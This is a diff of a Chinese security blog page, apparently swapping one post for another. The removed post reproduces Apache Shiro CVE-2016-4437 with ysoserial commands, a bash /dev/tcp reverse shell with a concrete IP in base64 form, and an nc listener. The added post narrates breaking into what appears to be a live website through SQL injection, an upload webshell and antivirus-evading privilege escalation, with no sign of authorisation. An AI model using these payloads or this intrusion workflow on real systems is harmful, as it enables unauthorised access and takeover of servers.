@@ -20,26 +20,35 @@
     var CONFIG = {"hostname":"hackedsb.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="环境搭建  docker pull medicean&#x2F;vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean&#x2F;vulapps:s_shiro_   VPS运行ysoserial.jar  java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsColl">
+  <meta name="description" content="网站IIS7.5+PHP一波扫目录，有phpmyadmin robots.txt是空的  在主页上瞎鸡儿点击，发现一些带参数的Url，就随手测试了一下，http:&#x2F;&#x2F;www.xxx.php?aid&#x3D;1869%27 页面无内容显示  and 1&#x3D;1 1&#x3D;2测了下，确认是注入sqlmap跑下  随手把数据库名加在网站后面，发现403  翻出个图书馆管理后台，注入一把梭进去  就这堆功能没找到一个上传的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache-Shiro-1.2.4反序列化漏洞(CVE-2016-4437)-复现">
-<meta property="og:url" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="一次常规渗透+提权">
+<meta property="og:url" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="Art1st&#39;s blog">
-<meta property="og:description" content="环境搭建  docker pull medicean&#x2F;vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean&#x2F;vulapps:s_shiro_   VPS运行ysoserial.jar  java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsColl">
+<meta property="og:description" content="网站IIS7.5+PHP一波扫目录，有phpmyadmin robots.txt是空的  在主页上瞎鸡儿点击，发现一些带参数的Url，就随手测试了一下，http:&#x2F;&#x2F;www.xxx.php?aid&#x3D;1869%27 页面无内容显示  and 1&#x3D;1 1&#x3D;2测了下，确认是注入sqlmap跑下  随手把数据库名加在网站后面，发现403  翻出个图书馆管理后台，注入一把梭进去  就这堆功能没找到一个上传的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-1.png">
-<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-2.png">
-<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-3.png">
-<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-4.png">
-<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-5.png">
-<meta property="article:published_time" content="2020-07-27T07:37:31.000Z">
-<meta property="article:modified_time" content="2020-07-27T08:38:13.347Z">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-1.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-2.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-4.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-3.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-5.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-6.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-7.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-8.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-9.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-10.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-11.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-12.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-13.jpg">
+<meta property="og:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-14.jpg">
+<meta property="article:published_time" content="2020-07-27T09:23:30.000Z">
+<meta property="article:modified_time" content="2020-07-27T09:37:34.411Z">
 <meta property="article:author" content="Art1st">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-1.png">
+<meta name="twitter:image" content="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-1.jpg">
 
-<link rel="canonical" href="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -52,7 +61,7 @@
   };
 </script>
 
-  <title>Apache-Shiro-1.2.4反序列化漏洞(CVE-2016-4437)-复现 | Art1st's blog</title>
+  <title>一次常规渗透+提权 | Art1st's blog</title>
   
 
 
@@ -172,7 +181,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hackedsb.github.io/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://hackedsb.github.io/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -185,7 +194,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Apache-Shiro-1.2.4反序列化漏洞(CVE-2016-4437)-复现
+          一次常规渗透+提权
         </h1>
 
         <div class="post-meta">
@@ -196,7 +205,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-07-27 15:37:31 / 修改时间：16:38:13" itemprop="dateCreated datePublished" datetime="2020-07-27T15:37:31+08:00">2020-07-27</time>
+              <time title="创建时间：2020-07-27 17:23:30 / 修改时间：17:37:34" itemprop="dateCreated datePublished" datetime="2020-07-27T17:23:30+08:00">2020-07-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -204,7 +213,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
                 </span>
             </span>
 
@@ -219,42 +228,27 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>环境搭建</p>
-<blockquote>
-<p>docker pull medicean/vulapps:s_shiro_1<br>启动docker镜像：<br>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_</p>
-</blockquote>
-<p><img src="/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-1.png" alt="BugWarning-1.png"></p>
-<p>VPS运行ysoserial.jar</p>
-<blockquote>
-<p>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “反弹 shell 的命令”</p>
-</blockquote>
-<p>反弹 shell 的命令需要bash编码</p>
-<a id="more"></a>
-<p>在线编码转换地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
-<blockquote>
-<p>bash -i &gt;&amp; /dev/tcp/VPS公网ip/1234 0&gt;&amp;1</p>
-</blockquote>
-<p><img src="/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-2.png" alt="BugWarning-2.png"></p>
-<blockquote>
-<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTM3Ljg5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}</p>
-</blockquote>
-<p>最终VPS运行</p>
-<blockquote>
-<p>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTM3Ljg5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}”</p>
-</blockquote>
-<p><img src="/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-3.png" alt="BugWarning-3.png"></p>
-<p>使用exp.py生成payload，需要python2的环境，命令如下：</p>
-<blockquote>
-<p>python2 exp.py 公网VPS:1099</p>
-</blockquote>
-<p>VPS开启NC监听</p>
-<blockquote>
-<p>nc -lvvp 1234</p>
-</blockquote>
-<p><img src="/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-4.png" alt="BugWarning-4.png"></p>
-<p>将rememberMe加在cookie的session值后请求</p>
-<p><img src="/2020/07/27/Apache-Shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2016-4437)-%E5%A4%8D%E7%8E%B0/BugWarning-5.png" alt="BugWarning-5.png"></p>
-<p>成功反弹shell</p>
+        <p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-1.jpg" alt="Penetration-1.png"><br><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-2.jpg" alt="Penetration-1.png"><br>网站IIS7.5+PHP<br>一波扫目录，有phpmyadmin robots.txt是空的</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-4.jpg" alt="Penetration-1.png"></p>
+<p>在主页上瞎鸡儿点击，发现一些带参数的Url，就随手测试了一下，<br><a href="http://www.xxx.php?aid=1869%27" target="_blank" rel="noopener">http://www.xxx.php?aid=1869%27</a> 页面无内容显示</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-3.jpg" alt="Penetration-1.png"></p>
+<p>and 1=1 1=2测了下，确认是注入<br>sqlmap跑下</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-5.jpg" alt="Penetration-1.png"></p>
+<p>随手把数据库名加在网站后面，发现403</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-6.jpg" alt="Penetration-1.png"></p>
+<p>翻出个图书馆管理后台，注入一把梭进去</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-7.jpg" alt="Penetration-1.png"></p>
+<p>就这堆功能没找到一个上传的地方。。</p>
+<p>继续看其他目录<br>在elearn目录的站点下<br>进去个后台下找到一个任意上传</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-8.jpg" alt="Penetration-1.png"><br><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-9.jpg" alt="Penetration-1.png"><br>直接点开发现并没有解析，一眼看这url还以为文件包含，后来看源码file.php里面并没有包含的函数，url拼接访问发现目录也不对<br><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-10.jpg" alt="Penetration-1.png"></p>
+<p>无意间把文件移动了到别的目录，访问原来的url，出来了绝对路径</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-11.jpg" alt="Penetration-1.png"><br>成功getshell<br><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-12.jpg" alt="Penetration-1.png"></p>
+<p>查看进程发现有eset 服务器信息是 08的服务器 ，补丁打了200多个 ，</p>
+<p>直接上了个免杀烂土豆执行发现成功了</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-13.jpg" alt="Penetration-1.png"></p>
+<p>机子已经开了3389</p>
+<p><img src="/2020/07/27/%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F+%E6%8F%90%E6%9D%83/pents-14.jpg" alt="Penetration-1.png"></p>
+<p>完事。</p>
 
     </div>
 
@@ -264,7 +258,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
           </div>
 
         
@@ -273,13 +267,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/07/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap%E5%A4%8D%E7%8E%B0/" rel="prev" title="网鼎杯朱雀组Nmap复现">
-      <i class="fa fa-chevron-left"></i> 网鼎杯朱雀组Nmap复现
+    <a href="/2020/07/27/Thinkphp-%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84/" rel="prev" title="Thinkphp 日志路径">
+      <i class="fa fa-chevron-left"></i> Thinkphp 日志路径
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/27/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E6%89%93%E8%B5%8F%E7%BD%91%E7%AB%99%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/" rel="next" title="对某视频打赏网站一次渗透">
-      对某视频打赏网站一次渗透 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
